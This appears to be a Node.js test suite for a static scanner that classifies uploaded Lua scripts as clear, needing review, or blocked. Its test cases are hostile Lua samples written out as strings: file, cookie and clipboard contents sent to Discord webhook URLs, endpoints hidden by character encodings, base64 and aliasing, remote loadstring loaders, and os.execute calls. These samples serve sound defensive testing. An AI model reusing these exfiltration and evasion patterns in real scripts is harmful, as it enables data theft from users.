'use strict';
const assert = require('assert/strict');
const { scanScript, combineScans, SCANNER_VERSION, MAX_BYTES } = require('./src/services/script-safety');
let checks = 0;
function test(name, run) { run(); checks++; console.log('PASS ' + name); }
function scan(code) { return scanScript(code); }
function has(result, rule) { return result.findings.some(finding => finding.rule === rule); }
const endpoint = 'https://discord.com/api/webhooks/123/PRIVATE_SECRET_TOKEN';

test('ordinary Lua has a clear static triage result', () => assert.equal(scan('local x = 1; print(x)').status, 'clear'));
test('empty input is refused', () => assert.equal(scan(' ').status, 'blocked'));
test('non-string input is refused without executing conversion', () => assert.equal(scan({ toString() { throw new Error('Executed'); } }).status, 'blocked'));
test('oversized input is refused', () => assert.equal(scan('x'.repeat(MAX_BYTES + 1)).status, 'blocked'));
test('SHA256 and scanner version are stable', () => {
  const result = scan('print(1)');
  assert.match(result.hash, /^[a-f0-9]{64}$/); assert.equal(result.hash, scan('print(1)').hash); assert.equal(result.scannerVersion, SCANNER_VERSION);
});
test('line comments cannot inject scanner findings', () => assert.equal(scan('-- readfile("cookies"); request("' + endpoint + '")\nprint(1)').status, 'clear'));
test('long comments with equals delimiters are ignored', () => assert.equal(scan('--[==[ getclipboard(); loadstring("secret"); request("' + endpoint + '") ]==]\nprint(1)').status, 'clear'));
test('function names inside plain text are not executable calls', () => assert.equal(scan('print("request readfile loadstring getclipboard")').status, 'clear'));
test('ordinary HTTP data use is informational', () => {
  const result = scan('local data = game:HttpGet("https://example.org/data.json")');
  assert.equal(result.status, 'clear'); assert(has(result, 'network_access'));
});
test('a webhook string alone requires review rather than automatic malware classification', () => assert.equal(scan('print("' + endpoint + '")').status, 'review'));
test('webhook requests are blocked', () => assert.equal(scan('request({Url="' + endpoint + '",Body="test"})').status, 'blocked'));
test('Discord versioned webhook endpoint is recognized', () => assert.equal(scan('syn.request({Url="https://discordapp.com/api/v10/webhooks/123/secret"})').status, 'blocked'));
test('Slack webhook request is recognized', () => assert.equal(scan('http_request({Url="https://hooks.slack.com/services/private"})').status, 'blocked'));
test('literal concatenation reconstructs endpoints', () => assert.equal(scan('request({Url="https://discord" .. ".com/api/" .. "webhooks/123/secret"})').status, 'blocked'));
test('constant variables reconstruct concatenated endpoints', () => assert.equal(scan('local host="https://discord.com"; local route="/api/webhooks/123/secret"; local url=host..route; request({Url=url})').status, 'blocked'));
test('decimal escapes reconstruct encoded endpoints', () => {
  const encoded = [...endpoint].map(c => '\\' + c.charCodeAt(0)).join('');
  assert.equal(scan('request({Url="' + encoded + '"})').status, 'blocked');
});
test('hex escapes reconstruct encoded endpoints', () => {
  const encoded = [...endpoint].map(c => '\\x' + c.charCodeAt(0).toString(16)).join('');
  assert.equal(scan('request({Url="' + encoded + '"})').status, 'blocked');
});
test('unicode escapes reconstruct encoded endpoints', () => {
  const encoded = [...endpoint].map(c => '\\u{' + c.charCodeAt(0).toString(16) + '}').join('');
  assert.equal(scan('request({Url="' + encoded + '"})').status, 'blocked');
});
test('string.char calls reconstruct encoded endpoints', () => assert.equal(scan('request({Url=string.char(' + [...endpoint].map(c => c.charCodeAt(0)).join(',') + ')})').status, 'blocked'));
test('string.char aliases reconstruct encoded endpoints', () => assert.equal(scan('local c=string.char; request({Url=c(' + [...endpoint].map(c => c.charCodeAt(0)).join(',') + ')})').status, 'blocked'));
test('bracket member request aliases are tracked', () => assert.equal(scan('local send=syn["re".."quest"]; send({Url="' + endpoint + '"})').status, 'blocked'));
test('request alias chains are tracked', () => assert.equal(scan('local a=request; local b=a; b({Url="' + endpoint + '"})').status, 'blocked'));
test('parenthesized aliases are tracked', () => assert.equal(scan('local a=(syn.request); a({Url="' + endpoint + '"})').status, 'blocked'));
test('parenthesized calls cannot hide capabilities', () => assert.equal(scan('(request)({Url="' + endpoint + '"})').status, 'blocked'));
test('called environment bracket members cannot hide capabilities', () => assert.equal(scan('getfenv()["request"]({Url="' + endpoint + '"})').status, 'blocked'));
test('encoded environment bracket members cannot hide dynamic execution', () => assert.equal(scan('getfenv()[string.char(108,111,97,100,115,116,114,105,110,103)](data)()').status, 'review'));
test('simple base64 endpoint strings are inspected', () => assert.equal(scan('request({Url=decode("' + Buffer.from(endpoint).toString('base64') + '")})').status, 'blocked'));
test('reading files requires review', () => assert.equal(scan('local x=readfile("settings.json")').status, 'review'));
test('file reading and network capabilities cannot pass without review', () => assert.equal(scan('local data=readfile("cookies"); request({Body=data})').status, 'review'));
test('sensitive alias plus network transfer cannot pass without review', () => assert.equal(scan('local read=readfile; local send=syn.request; send({Body=read("secret")})').status, 'review'));
test('clipboard reading and network transfer cannot pass without review', () => assert.equal(scan('request({Body=getclipboard()})').status, 'review'));
test('local key cache plus unrelated HTTP is reviewable instead of rejected', () => {
  const result=scan('local read=readfile; local key=read("license-cache.json"); assert(key); local response=game:HttpGet("https://example.invalid/ui.lua")');
  assert.equal(result.status,'review');
  assert(result.findings.some(f=>f.rule==='sensitive_network_transfer'&&f.severity==='review'));
});
test('clipboard writing alone is informational', () => assert.equal(scan('setclipboard("https://example.org/key")').status, 'clear'));
test('filesystem mutations require review', () => assert.equal(scan('writefile("config.json", "{}"); delfile("config.json")').status, 'review'));
test('remote executable loaders require review', () => {
  const result = scan('loadstring(game:HttpGet("https://example.org/code.lua"))()');
  assert.equal(result.status, 'review'); assert(has(result, 'remote_dynamic_code'));
});
test('dynamic code aliases require review', () => assert.equal(scan('local run=loadstring; run(data)()').status, 'review'));
test('external require modules require review', () => assert.equal(scan('local library=require(123456)').status, 'review'));
test('large encoded literals cannot be classified clear', () => assert.equal(scan('local payload="' + 'A'.repeat(2048) + '"').status, 'review'));
test('opaque virtual machine numeric payload is held', () => assert.equal(scan('local bytes={' + Array(1100).fill(42).join(',') + '}; while true do local op=bytes[1] end').status, 'review'));
test('truncated inspected literals are held for review', () => assert.equal(scan('local payload=[=[' + 'x!'.repeat(9000) + ']=]').status, 'review'));
test('incomplete strings are held, with no raw content returned', () => assert.equal(scan('local x="SECRET').status, 'review'));
test('findings contain safe fields only and never raw secrets', () => {
  const result = scan('readfile("SENSITIVE_FILENAME"); request({Url="' + endpoint + '"})');
  assert(!JSON.stringify(result).includes('PRIVATE_SECRET_TOKEN')); assert(!JSON.stringify(result).includes('SENSITIVE_FILENAME'));
  for (const finding of result.findings) assert.deepEqual(Object.keys(finding).sort(), ['line', 'rule', 'severity']);
});
test('findings report source line numbers', () => assert(scan('print(1)\n\nlocal x=readfile("x")').findings.some(f => f.rule === 'sensitive_data_access' && f.line === 3)));
test('findings are bounded without downgrading a later high finding', () => {
  const code = Array.from({ length: 80 }, (_, i) => 'request({Url="https://example.org/' + i + '"})').join('\n') + '\nos.execute("never run")';
  const result = scan(code); assert(result.findings.length <= 64); assert.equal(result.status, 'blocked'); assert(result.findings.some(f => f.severity === 'high'));
});
test('token explosion is bounded and requires independent review', () => {const result=scan(';'.repeat(150001));assert.equal(result.status,'review');assert(result.findings.some(x=>x.rule==='scan_token_limit'));});
test('a clear obfuscated output does not erase source triage evidence', () => {
  const before = scan('loadstring(remote)()'); const after = scanScript('local a=1;print(a)', { phase: 'output' });
  assert.equal(before.status, 'review'); assert.equal(after.status, 'clear');
});
test('scanner never executes uploaded source', () => {
  const source = 'os.execute("echo SHOULD_NEVER_EXECUTE"); error("NEVER_EXECUTE")';
  assert.doesNotThrow(() => scan(source));
});
test('operating system process execution is blocked', () => assert.equal(scan('os.execute("echo evil")').status, 'blocked'));
test('computed global capabilities require review',()=>assert.equal(scan('_G[hiddenName](payload)').status,'review'));
test('dynamic environment aliases require review',()=>assert.equal(scan('local env=getfenv(); env[secret](data)').status,'review'));
test('decoder aliases cannot hide variable character decoding',()=>assert.equal(scan('local c=string.char; c(value)').status,'review'));
test('literal character decoding remains inspectable',()=>assert.equal(scan('print(string.char(65,66,67))').status,'clear'));
test('runtime decryption requires review',()=>assert.equal(scan('local text=crypto.decrypt(secret); print(text)').status,'review'));
test('XOR decoder requires review',()=>assert.equal(scan('local text=bit32.bxor(byte,42)').status,'review'));
test('decoder names in plain strings do not imply execution',()=>assert.equal(scan('print("decode decrypt bxor")').status,'clear'));
test('clear source never waives an opaque generated VM',()=>{
 const before=scan('return 1'),after=scanScript('local bytes={'+Array(1100).fill(42).join(',')+'};while true do local op=bytes[1] end',{phase:'output'});
 const combined=combineScans(before,after);assert.equal(combined.status,'review');assert.equal(combined.hash,after.hash);
});
test('token limits on output always require review',()=>assert.equal(combineScans(scan('return 1'),scanScript(';'.repeat(150001),{phase:'output'})).status,'review'));
test('clear output cannot erase suspicious source',()=>assert.equal(combineScans(scan('loadstring(remote)()'),scan('return 1')).status,'review'));
test('malicious output remains blocked',()=>assert.equal(combineScans(scan('return 1'),scan('os.execute("never run")')).status,'blocked'));
test('missing or stale scan results fail closed',()=>{
 assert.throws(()=>combineScans(scan('return 1'),null));
 assert.throws(()=>combineScans({...scan('return 1'),scannerVersion:'stale'},scan('return 1')));
});
console.log('Script safety: ' + checks + ' checks passed.');
